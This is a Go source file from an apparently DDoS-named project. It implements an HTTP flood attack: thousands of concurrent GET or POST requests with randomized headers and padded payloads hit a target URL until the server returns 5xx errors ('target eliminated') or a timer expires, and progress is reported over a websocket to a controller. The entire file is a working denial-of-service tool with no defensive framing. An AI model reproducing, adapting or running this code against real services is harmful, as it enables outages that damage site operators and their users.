package distributor

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"sync"
	"encoding/json"
	"bytes"
	"sync/atomic"
	"strings"
	"math/rand"
	"os"
	"time"

	w "ddos/lib/websocket"
	"ddos/lib/unit"
	"golang.org/x/net/websocket"
	"ddos/lib/headers"
)

const (
	MAX_PAYLOAD_SIZE = unit.KILOBYTE_SIZE * 5

	CALL_CONNECTION_MADE        uint8 = iota
	CALL_EXIT_ON_ERROR
	CALL_EXIT_ON_TOO_MANY_FILES
	CALL_TARGET_ELIMINATED
	CALL_TIME_RAN_OUT
)

var (
	currConnections int32 = 0
	maxConnections  int32 = 4096
)

type AttackConfig struct {
	KbPerRequest int `json:"kb_per_request,string"`
	URL          string `json:"url"`
	StopOnCrash  bool `json:"stop_on_crash"`
	Method       string `json:"method"`
	Duration     time.Duration `json:"duration,string"`
	parsedUrl    *url.URL
}

type AttackData struct {
	Payload string `json:"payload"`
}

type attackResponse struct {
	TotalRequests           int `json:"total_requests,string"`
	totalRequestsMu         sync.RWMutex
	PayloadSize             int `json:"payload_size,string"`
	payloadSizeMu           sync.RWMutex
	PayloadSizeType         string `json:"payload_size_type"`
	payloadSizeTypeMu       sync.RWMutex
	TargetEliminated        bool `json:"target_eliminaed,string"`
	targetEliminatedMu      sync.RWMutex
	TimeRanOut              bool `json:"time_ran_out,string"`
	timeRanOutMu            sync.RWMutex
	totalPayloadBytesSize   int
	totalPayloadBytesSizeMu sync.RWMutex
}

func Attack(cfg *AttackConfig) {
	go attack(cfg)
}

func attack(cfg *AttackConfig) {
	if !strings.Contains(cfg.URL, "http://") && !strings.Contains(cfg.URL, "https://") {
		cfg.URL = "http://" + cfg.URL
	}

	u, err := url.Parse(cfg.URL)
	if err != nil {
		fmt.Printf("Error parsing URL: %v", cfg.URL)
		return
	}
	cfg.parsedUrl = u

	ar := new(attackResponse)
	ch := make(chan uint8, 8)
	var errors int32

	go func() {
		time.Sleep(cfg.Duration * time.Second)
		ch <- CALL_TIME_RAN_OUT
	}()

	fmt.Println("\nConnections in use | Resp OK | Errors")
	for {
		if atomic.LoadInt32(&currConnections) < maxConnections-1 {
			if cfg.Method == "POST" {
				go httpPost(cfg, ar, ch)
			} else if cfg.Method == "GET" {
				go httpGet(cfg, ar, ch)
			}
		}

		ar.totalRequestsMu.RLock()
		requests := ar.TotalRequests
		ar.totalRequestsMu.RUnlock()

		if requests%10 == 0 {
			logUpdate(requests, errors, false)
		}

		switch <-ch {
		case CALL_CONNECTION_MADE:
			atomic.AddInt32(&currConnections, 1)
		case CALL_EXIT_ON_ERROR:
			atomic.AddInt32(&currConnections, -1)
			errors++
		case CALL_EXIT_ON_TOO_MANY_FILES:
			atomic.AddInt32(&currConnections, -1)
			maxConnections--
		case CALL_TARGET_ELIMINATED:
			logUpdate(requests, errors, true)
			fmt.Println("Target server has been eliminated.")

			ar.TargetEliminated = true
			websocket.JSON.Send(w.Socket, ar)
			os.Exit(0)
		case CALL_TIME_RAN_OUT:
			logUpdate(requests, errors, true)
			fmt.Printf("Time ran out after %v seconds elapsed.", int(cfg.Duration))

			ar.TimeRanOut = true
			websocket.JSON.Send(w.Socket, ar)
			os.Exit(0)
		}
	}
}

func httpPost(cfg *AttackConfig, a *attackResponse, ch chan uint8) {
	ch <- CALL_CONNECTION_MADE
	var client = new(http.Client)

	for {
		j, _ := json.Marshal(AttackData{makePayload(cfg)})
		req, err := http.NewRequest("POST", cfg.URL, bytes.NewBuffer(j))
		if err != nil {
			ch <- CALL_EXIT_ON_ERROR
			return
		}

		headers.Randomize(req, cfg.parsedUrl.Host)

		resp, err := client.Do(req)
		if ok := closeConn(resp, err, ch); ok {
			updateTotals(cfg, a)
		}

		if cfg.StopOnCrash {
			if resp.StatusCode >= http.StatusInternalServerError {
				ch <- CALL_TARGET_ELIMINATED
				return
			}
		}
	}
}

func httpGet(cfg *AttackConfig, a *attackResponse, ch chan uint8) {
	ch <- CALL_CONNECTION_MADE
	var client = new(http.Client)
	var separator string

	if strings.ContainsRune(cfg.URL, '?') {
		separator = "&"
	} else {
		separator = "?"
	}

	for {
		u := cfg.URL + separator + headers.BuildBlock(rand.Intn(7)+3) + "=" + makePayload(cfg)
		req, err := http.NewRequest("GET", u, nil)
		if err != nil {
			ch <- CALL_EXIT_ON_ERROR
			return
		}

		headers.Randomize(req, cfg.parsedUrl.Host)

		resp, err := client.Do(req)
		if ok := closeConn(resp, err, ch); ok {
			updateTotals(cfg, a)
		}

		if cfg.StopOnCrash {
			if resp.StatusCode >= http.StatusInternalServerError {
				ch <- CALL_TARGET_ELIMINATED
			}
		}
	}
}

func closeConn(resp *http.Response, err error, ch chan uint8) bool {
	if err != nil {
		if strings.Contains(err.Error(), "socket: too many open files") {
			ch <- CALL_EXIT_ON_TOO_MANY_FILES
			return false
		}

		ch <- CALL_EXIT_ON_ERROR
		return false
	}

	io.Copy(ioutil.Discard, resp.Body)
	resp.Body.Close()
	return true
}

func updateTotals(cfg *AttackConfig, ar *attackResponse) {
	requestedKb := cfg.KbPerRequest * unit.KILOBYTE_SIZE

	ar.totalPayloadBytesSizeMu.Lock()
	// Increment the total payload bytes size based on the requested KB amount
	if requestedKb > MAX_PAYLOAD_SIZE {
		ar.totalPayloadBytesSize += MAX_PAYLOAD_SIZE
	} else if requestedKb > 0 && requestedKb <= MAX_PAYLOAD_SIZE {
		ar.totalPayloadBytesSize += requestedKb
	} else {
		ar.totalPayloadBytesSize += unit.KILOBYTE_SIZE
	}
	byteSizeMemo := ar.totalPayloadBytesSize
	ar.totalPayloadBytesSizeMu.Unlock()

	ar.payloadSizeMu.Lock()
	ar.payloadSizeTypeMu.Lock()
	// Set payload size and type based on total amount of bytes sent so far
	// For example, if 1,024,000 bytes sent (1MB), that would be evaluate
	// to ar.PayloadSize = 1, ar.PayloadSizeType = "MB"
	if byteSizeMemo >= unit.GIGABYTE_SIZE {
		ar.PayloadSize = byteSizeMemo / unit.GIGABYTE_SIZE
		ar.PayloadSizeType = unit.GIGABYTE_TEXT
	} else if byteSizeMemo >= unit.MEGABYTE_SIZE {
		ar.PayloadSize = byteSizeMemo / unit.MEGABYTE_SIZE
		ar.PayloadSizeType = unit.MEGABYTE_TEXT
	} else if byteSizeMemo >= unit.KILOBYTE_SIZE {
		ar.PayloadSize = byteSizeMemo / unit.KILOBYTE_SIZE
		ar.PayloadSizeType = unit.KILOBYTE_TEXT
	}
	ar.payloadSizeMu.Unlock()
	ar.payloadSizeTypeMu.Unlock()

	ar.totalRequestsMu.Lock()
	ar.TotalRequests++
	// Send socket with updated values every 100 requests
	if ar.TotalRequests%10 == 0 {
		websocket.JSON.Send(w.Socket, ar)
	}
	ar.totalRequestsMu.Unlock()
}

func makePayload(cfg *AttackConfig) string {
	var payload string

	size := cfg.KbPerRequest
	if size > 5 {
		size = 5
	}

	for i := 0; i < size; i++ {
		payload += unit.KILOBYTE_STRING
	}

	return payload
}

func logUpdate(requests int, errors int32, newLine bool) {
	if newLine {
		fmt.Printf("\r%-6d of max %-4d | %7d | %6d\n", currConnections, maxConnections, requests, errors)
	} else {
		fmt.Printf("\r%-6d of max %-4d | %7d | %6d", currConnections, maxConnections, requests, errors)
	}
}